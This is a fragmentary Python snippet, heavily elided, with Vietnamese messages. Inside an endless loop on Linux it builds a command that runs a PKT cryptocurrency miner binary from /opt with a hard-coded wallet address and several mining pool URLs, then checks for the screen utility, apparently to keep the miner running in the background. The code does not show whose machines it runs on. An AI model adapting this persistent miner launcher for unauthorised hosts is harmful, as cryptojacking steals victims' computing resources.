...
if operate_system == 'lin':
    ...
    while True:
        ...
        try:
            ...
            pass
        if pkt_dachay == False:
            #command = '/opt/%s ann -p pkt1qnq9w4as9fk6qke8j66c39hk227rx634eguzn67 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com http://pool.pkthash.com -t 2' % pkt_name
            command = '/opt/%s ann -p pkt1qnq9w4as9fk6qke8j66c39hk227rx634eguzn67 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com' % pkt_name
            #command = '/opt/%s ann -p pkt1qnq9w4as9fk6qke8j66c39hk227rx634eguzn67 http://pool.pkt.world/ http://pool.pktpool.io/' % pkt_name
            print(command)
            if os.path.isfile('/usr/bin/screen'):
                print('Co chuong trinh screen')
